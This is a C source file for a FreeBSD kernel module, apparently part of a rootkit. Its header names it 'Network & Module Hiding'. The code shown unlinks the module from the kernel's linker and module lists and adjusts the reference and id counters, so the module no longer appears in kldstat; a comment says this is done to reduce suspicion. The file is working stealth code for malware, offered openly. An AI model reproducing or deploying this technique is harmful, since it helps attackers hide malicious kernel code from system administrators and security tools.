/*
 * =====================================================================================
 *
 *       Filename:  net_hiding.c
 *
 *    Description:  Network & Module Hiding
 *
 *        Version:  1.0
 *        Created:  22/06/2011 01:13:16
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Steffen L. Norgren (http://trollop.org), ironix@trollop.org
 *        Company:  Esurient Systems Inc.
 *
 * =====================================================================================
 */
#include "net_hiding.h"

static void hide_module(void)
{
    struct linker_file *lf;
    struct module *mod;

    /* Giant lock is used in the kernel to provice concurrency control */
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    /*
     * Decrement the current kernel image's reference count. This reduces suspicion
     * when executing 'kldstat', for if another kernel module is loaded, there will
     * be a gap in the list of ids.
     */
    (&linker_files)->tqh_first->refs--;

    /*
     * Iterate throught he linker_files list, looking for MODULE_FILE. If found,
     * decrement the next_file_id and remove from the list.
     */
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, MODULE_FILE) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    /* 
     * Shared/exclusive locks are used to protect data that are read far more
     * often than they are written.
     */
    sx_xlock(&modules_sx);

    /*
     * Iterate through the module list, looking for MODULE_NAME. If found,
     * decrement nextid and remove from the list.
     */
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, MODULE_NAME) == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }

    sx_xunlock(&modules_sx);
}

static int module_events(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd) {
        case MOD_LOAD:
            uprintf("Module %s loaded.\n", MODULE_FILE);

            if (MODULE_HIDE) {
                uprintf("Hiding %s module.\n", MODULE_FILE);
                hide_module();
            }
            break;

        case MOD_UNLOAD:
            uprintf("Module %s unloaded.\n", MODULE_FILE);
            break;

        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t net_hiding_mod = {
    MODULE_NAME,    /* module name */
    module_events,  /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(net_hiding, net_hiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
